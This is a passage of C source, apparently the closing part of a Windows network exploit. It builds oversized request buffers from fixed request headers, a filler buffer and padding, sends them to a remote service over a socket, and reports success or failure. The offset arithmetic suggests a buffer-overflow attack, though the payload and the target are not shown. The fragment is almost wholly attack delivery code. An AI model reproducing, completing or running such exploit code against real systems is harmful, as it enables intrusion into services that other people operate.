  if (send(sockfd, screq2k, 4348, 0) == -1) {
  printf("[-] Send failed\n");
  exit(1);
  }
  len = recv(sockfd, recvbuf, 1600, 0);

  if (send(sockfd, screq2k2, 4060, 0) == -1) {
  printf("[-] Send failed\n");
  exit(1);
  }

  } else {
  memcpy(screq, req7, sizeof(req7)-1);
  memcpy(screq+sizeof(req7)-1, &strBuffer[0], BUFSIZE);
  memcpy(screq+sizeof(req7)-1+BUFSIZE, shit1, 9*16);

  screq[BUFSIZE+sizeof(req7)-1+1500-304-1] = 0;
  if (send(sockfd, screq, BUFSIZE+sizeof(req7)-1+1500-304, 0)== -1){
  printf("[-] Send failed\n");
  exit(1);
  }
  }
  printf("OK\n");

  len = recv(sockfd, recvbuf, 1600, 0);

  CloseHandle(hThread);
  WSACleanup();
  return 0;
}
